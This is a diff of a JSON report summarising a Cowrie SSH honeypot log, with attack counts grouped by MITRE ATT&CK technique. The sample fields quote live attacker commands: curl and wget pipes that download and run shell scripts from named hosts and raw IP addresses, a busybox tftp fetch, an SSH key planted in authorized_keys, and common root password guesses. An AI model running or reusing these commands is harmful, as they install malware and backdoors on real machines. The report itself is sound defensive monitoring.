@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-24 16:02:06",
+  "generated": "2026-08-24 17:04:45",
   "totals": {
-    "commands": 438,
-    "login_failed": 1037,
-    "login_success": 87,
-    "sessions": 1224
+    "commands": 441,
+    "login_failed": 1185,
+    "login_success": 89,
+    "sessions": 1379
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1037,
+      "count": 1185,
       "examples": [
         "root / 123456",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-08-24T00:00:38.589360Z",
-      "last": "2026-08-24T16:02:06.471750Z",
-      "unique_ips": 82
+      "last": "2026-08-24T17:04:10.184417Z",
+      "unique_ips": 84
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 87,
+      "count": 89,
       "examples": [
         "root / e10adc39",
         "ubuntu / ubuntu",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-08-24T00:20:02.041462Z",
-      "last": "2026-08-24T15:55:25.883736Z",
-      "unique_ips": 60
+      "last": "2026-08-24T16:55:20.288290Z",
+      "unique_ips": 61
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 61,
+      "count": 64,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
       ],
       "first": "2026-08-24T00:50:34.498920Z",
-      "last": "2026-08-24T13:28:35.044691Z",
+      "last": "2026-08-24T16:35:11.669188Z",
       "unique_ips": 9
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 38,
+      "count": 40,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -69,7 +69,7 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-24T00:50:33.416948Z",
-      "last": "2026-08-24T13:28:34.835771Z",
+      "last": "2026-08-24T16:35:11.207459Z",
       "unique_ips": 11
     },
     {
@@ -92,7 +92,7 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 6,
+      "count": 8,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -100,7 +100,7 @@
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
       ],
       "first": "2026-08-24T00:50:37.867683Z",
-      "last": "2026-08-24T09:03:14.389500Z",
+      "last": "2026-08-24T16:35:11.207459Z",
       "unique_ips": 5
     },
     {
@@ -121,13 +121,13 @@
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 4,
+      "count": 5,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
       ],
       "first": "2026-08-24T02:00:04.192282Z",
-      "last": "2026-08-24T09:03:14.389500Z",
+      "last": "2026-08-24T16:35:11.207459Z",
       "unique_ips": 4
     },
     {
@@ -265,12 +265,12 @@
       2
     ],
     [
-      "/bin/busybox V3G4",
+      "exit",
       2
     ],
     [
-      "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
-      1
+      "/bin/busybox V3G4",
+      2
     ]
   ]
 }
